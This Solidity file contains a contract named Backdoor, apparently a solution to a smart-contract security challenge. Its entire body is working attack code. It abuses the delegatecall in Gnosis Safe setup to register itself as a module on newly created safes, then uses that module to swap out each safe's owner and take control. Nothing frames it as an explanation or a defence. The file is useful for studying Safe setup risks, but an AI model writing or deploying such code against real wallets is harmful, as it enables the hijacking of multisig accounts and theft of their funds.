pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "hardhat/console.sol";

/**
 * The Backdoor contract call the proxy factory and leverages the 'delegatecall' in the setup of the Gnosis Safe to registers as a trusted module.
 * Any functions can then be executed from the Gnosis Safe.
 */
contract Backdoor is ModuleManager {
	function exploit(address _proxyFactory, address[] memory _owners, address _safe, address _target) external {
		address[] memory setup_owners = new address[](1);
		for (uint256 i = 0; i < _owners.length; ++i){
			setup_owners[0] = _owners[i];
			bytes memory initializer = abi.encodeWithSelector(
				GnosisSafe.setup.selector,
				setup_owners, // Owners
				1, // Threshold
				address(this), // Delegate call contract
				abi.encodeWithSelector(this.registerBackdoor.selector, address(this)), // Delegate call data
				address(0), // fallBackhandler
				address(0), // paymentToken
				0, // paymentAmount
				address(0) // paymentReceiver
			);
			GnosisSafeProxyFactory(_proxyFactory).createProxyWithCallback(_safe, initializer, 0, IProxyCreationCallback(_target));
		}
	}

	function registerBackdoor(address _this) public {
		execute(address(this), 0, abi.encodeWithSignature("enableModule(address)", _this), Enum.Operation.Call, gasleft());
		console.log("[REGISTER]\tModule", _this, "registered for safe", address(this));
		require(GnosisSafe(payable(address(this))).isModuleEnabled(_this));
	}

	function triggerBackdoor(address _proxy, address _owner, address _new) external {
		GnosisSafe proxy = GnosisSafe(payable(_proxy));
		proxy.execTransactionFromModule(_proxy, 0, abi.encodeWithSignature("swapOwner(address,address,address)", 0x1, _owner, _new), Enum.Operation.Call);
		console.log("[TRIGGER]\tOwnership of", _owner, "transferred to", proxy.getOwners()[0]);
	}
}
